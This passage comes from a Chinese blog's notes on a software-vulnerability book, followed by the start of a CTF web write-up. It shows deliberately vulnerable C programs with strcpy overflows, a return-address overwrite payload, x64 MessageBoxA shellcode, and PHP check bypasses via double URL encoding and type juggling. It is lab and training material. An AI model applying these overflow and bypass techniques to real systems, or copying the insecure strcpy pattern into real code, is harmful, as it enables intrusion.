<br></code></pre></td></tr></table></figure><p>此时笔者转去学习<code>x64dbg</code>了，不然用起来很不顺手🤣，如果需要了解简单的用法，见上一篇博客</p><p>浅浅学习归来，</p><p>首先将程序拖进<code>x64dbg</code>，然后寻找验证函数的位置，在此模块搜索字符串，然后定位到大致位置</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-30-13.png"></p><p>分析一下：大概在读取输入之后，调用了地址<code>0000000000401550</code>处的函数，找到该处</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-32-16.png"></p><p>挺近的，可以发现<code>push rbp</code>压入栈底，然后在call完<code>strcpy</code>函数后打下断点</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-34-18.png"></p><p>那么我们先运行程序到输入密码处，然后输入密码，开始调试程序</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-01_21-22-37.png"></p><p>进入断点，此时我们知道存在一个<code>strcpy</code>函数，那么之后会有一个返回值，在内存中找到返回值的地方，选中上断点的反汇编代码，然后在详细信息表格中双击将要写入eax寄存器的那个内存的地址，然后会在内存试图里显示，由于我这里输入的是<code>xxxxxxx</code>，所以值是1，当然不能通过验证</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-52-58.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-58-52.png"></p><p>如果我们输入8个<code>x</code>呢，可以发现，返回标志被溢出的换行符替换为0了，即可通过验证！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-56-38.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-00-03.png"></p><p>至于为什么是8个<code>x</code>，其实很好理解，因为定义的是一个8个字符的数组哒！刚好最后一个截断字符溢出哒！</p><p>刚好我们人为制造的字符数组和Auth相邻哒！</p><p>但是你会意外的发现，如果输入字符串小于<code>3xsh0re</code>，即使输入8个字符也不能冲破验证，这是因为小于则<code>strcmp</code>函数的返回值为-1，那么就会导致Auth的值为0xFFFFFFFF，就算淹没了两个字节变为0xFFFFFF00也无济于事的🤣</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-17-24.png"></p><p>当然笔者这里还有一个办法，想办法在输入中跟上7个截断字符，刚好淹没所有的Auth，当然这里在命令行里输入不太方便，然后笔者发现在之后的crack实验，我们通过文件读取的方式可以实现！😎</p><h3 id="控制程序执行的流程"><a href="#控制程序执行的流程" class="headerlink" title="控制程序执行的流程"></a>控制程序执行的流程</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​我们通过上面的学习，已经知道利用栈溢出可以修改邻接变量，更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 EBP 和函数返回地址等栈帧状态值。</p><h4 id="crack-me3"><a href="#crack-me3" class="headerlink" title="crack_me3"></a>crack_me3</h4><p>​用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、0x12 等符号）无法直接用键盘输入，所以我们把用于实验的代码稍作改动，将程序的输入由键盘改为从文件中读取字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>))) <br>    &#123; <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    &#125; <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    &#123; <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n&quot;</span>); <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123; <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>    &#125; <br>    fclose(fp); <br>&#125;<br></code></pre></td></tr></table></figure><p>将上面的代码编译为exe，然后在同级目录下创建password.txt文件。</p><p>在动手之前，理清思路：</p><p>1.我们需要摸清楚栈中的状况</p><p>2.破解目标是通过密钥验证，所以应该知道密钥验证通过的指令地址</p><p>3.通过文件缓冲区溢出在返回地址处填上地址</p><p>通过x64dbg打开之前的编译好的文件，找到验证通过的指令地址。可以通过右键查找用户模块字符串快速找到。</p><p>可以得到地址为0x0000 0000 0040 161B，这里因为是在x86-64下，地址为64位，不同于书上是32位的。那么我们之后覆盖的返回值地址就是这里了😋</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_11-14-28.png"></p><p>然后我们找到缓冲区的位置，首先在password.txt里输入“1234”，然后在通过调试在验证函数的下面这个地方打上断点：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-11-03.png"></p><p>然后在堆栈区找到我们的缓冲区地址：我们这里是0000 0000 0061 F9D0，可以发现其中填充的是“34333231”，正是我们的输入。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-13-46.png"></p><p>接下来就是制作我们的payload了，从上面的图可以发现，要淹没返回值需要5*4个无效字节加上构造的返回值地址，这里为什么是5个不是6个，因为对于双字数据，在内存中的存放按照从地址低到高这里也就是1234，而在作为数值时是从高到低的，这是由于调试器的原因会在堆栈区按数值显示，也就是对于00..061F9D0的偏移在栈中是7-&gt;0，所以是填充6个。</p><p>使用winhex编辑txt文件的16进制，内容如下：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-19-01.png"></p><p>然后运行，成功！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-21-12.png"></p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-20-10.png"></p><h3 id="在缓冲区植入代码"><a href="#在缓冲区植入代码" class="headerlink" title="在缓冲区植入代码"></a>在缓冲区植入代码</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们已经完成修改返回地址的壮举！😋那么我们为何不将返回地址改到我们自己的输入上呢，这样不就可以执行我们自己的代码了，那么我们的代码放哪，放缓冲区噻，之前填充的是无用的数值，填充指令不就可以了。</p><h4 id="crack-me4"><a href="#crack-me4" class="headerlink" title="crack_me4"></a>crack_me4</h4><p>和实验3一样通过文件读取，不过改了缓冲区大小，加入了包含窗口调用dll。目的是在缓冲区填充弹窗的代码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span> <span class="hljs-comment">//包含user32.dll</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">44</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<span class="hljs-comment">//prepare for messagebox </span><br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>))) <br>    &#123; <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    &#125; <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n&quot;</span>); <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>    &#125; <br>    fclose(fp); <br>&#125;<br></code></pre></td></tr></table></figure><p>和之前一样需要获得函数调用在内存中的返回返回到缓冲区的地址，打开x64dbg，开调！</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-56-32.png"></p><p>根据之前的调试方法，我们可以找到缓冲区的地址：0000 0000 0061 F9B0，接下来就需要我们编写password.txt里的内容了，肯定是要淹没到返回地址的位置的，看看上面的堆栈信息，可以发现我们需要设置7*12345678+缓冲区地址。在Winhex里编辑如下：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-29-16.png"></p><p>调试一下，发现成功淹没</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-31-00.png"></p><p>接下来就是编写我们植入的代码，我们需要定位到内存中MessageBox的地址，这里不沿用书的方法，我们直接在x64dbg中查看符号文件，搜索即可得到地址为：0x00007FFB294DA000</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-25-41.png"></p><p>然后编写shellcode：这里笔者花了大量的时间来写shellcode，</p><p><strong>第一个问题是一开始没有调高栈顶，也就是没有对rsp进行修改，导致运行时新入栈的值淹没了我的shellcode，所以调高了栈顶</strong></p><p><strong>第二个问题是发现无法在堆栈中执行命令，尝试在系统中关闭了DEP，但是还是不行，然后在调试器中，右键转到内存，然后右键该区域，内存权限，修改为可执行权限即可</strong></p><p><strong>第三个问题是发现64位的地址中会有0x00，不可避免，选择使用逻辑移位的方式构造跳转地址。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB rsp,64;调高栈顶，防止栈帧破坏shellcode<br>XORebx,ebx;得0<br>PUSHebx<br>MOV rax,0x3378736830726521;!er0hsx3<br>PUSHrax<br>MOVrax,rsp;将字符串指针给rax<br>PUSHebx;压入函数参数<br>PUSHrax<br>PUSHrax<br>PUSHebx<br>MOVrax,0x7FFB294DA0;防止0x00被截断，使用移位的方式构造函数地址<br>SHLrax,24<br>SHRrax,16<br>CALLrax;call MessageBoxA<br>ADDrsp,64;回收栈顶<br></code></pre></td></tr></table></figure><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-06-05.png"></p><p>·<img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-21-16.png"></p><p>右键修改可执行权限</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-22-12.png"></p><p>全选然后设置权限</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-23-02.png"></p><p>发现已经执行到MessageBoxA函数处😁：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-24-55.png"></p><p>最后一个问题没有解决！为什么不弹窗！为什么！😅</p><p>第二章就结束了，虽然最后有个小遗憾，但是笔者已经花了大量的时间动手去完成任务，并且效果还不错，所以就不纠结于弹窗了哈哈😀</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-攻防世界-WEB-WP</title>
    <link href="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/"/>
    <url>/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/</url>
    
    <content type="html"><![CDATA[<p>好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭</p><span id="more"></span><h4 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1_PHP2"></a>1_PHP2</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>打开只有一个显示，“Can you anthenticate to this website?”，检查源代码也没有其他显示。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg"></p><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><p>  <strong>phps文件就是php的源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><ul><li>浏览器在将请求传回服务端时会对url解码一次后传回。</li></ul><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先访问index.php，回显没有变化。试着访问源码phps文件index.phps，发现源码</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg"></p><p>源码分析：当输入url中输入id&#x3D;admin时，echo“not allowed!”，不是想要的结果。</p><p>我们发现浏览器会对url解码一次，然后urldecode再对url解码一次，相当于对url解码了两次，所以我们再url后跟的应该有url编码两次后的字符，查表，将字符a写为%25%36%31，浏览器解码一次后变为%61，再经过urlencode解码一次后为a，通过检验。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg"></p><h4 id="2-EasyPHP"><a href="#2-EasyPHP" class="headerlink" title="2_EasyPHP"></a>2_EasyPHP</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>直接进入，发现php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>)&#123;      <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">&#x27;8b184b&#x27;</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))&#123;<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...再想想&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>] &gt; <span class="hljs-number">2022</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>]))&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Hgfks.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You&#x27;re right&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP substr函数：substr(<em>string,start,length</em>)</p><p>start：规定何处开始，<strong>可以是负数</strong>，表明在从<strong>字符串结尾</strong>的指定位置开始，-2表示从倒数第二个开始。</p></li><li><p>&#x3D;&#x3D;<strong>PHP 中字符串与数值比较的陷阱</strong>&#x3D;&#x3D;：</p><ul><li>当两个字符比较时，就是比较他们的ASCII码</li><li>两个字符串进行比较时，是从第一位开始比较其ASCII码，只要有一位出现了 差异，就返回比较结果。</li><li>当字符串与数字比较时，<strong>首先系统尝试将此字符串&#x2F;字符转换为整型&#x2F;浮点型</strong>，然后进行比较，如**’12bsd’转型为12<strong>，</strong>‘a’转型为0<strong>，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。其实同样的道理，’a’+10结果也是10。并且容易忽略的：</strong>0 与任意不可转化为数字的字符串比较(操作符为双等时。即松散比较), 均返回 true。**</li></ul></li></ul><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​        直接看到代码尾部有一个Hgfks.php，试着直接访问，发现不行，又访问Hgfks.phps，也不行，好吧，阅读前面的代码。首先从地址栏读取了a,b两个参数，第一个函数是if判断是检验a,b的值是否符合要求，首先对a，有个<strong>intval函数</strong>，将任意类型转为int型，然后这个值要大于6000000，且a的长度不超过3个字符。那么可以用9e9这种方式传入。再看b，<strong>是要b的MD5码的最后6位等于给定输入，尝试用bp爆破，也可以写python脚本碰撞</strong>。得到53724为b的值。</p><p><img 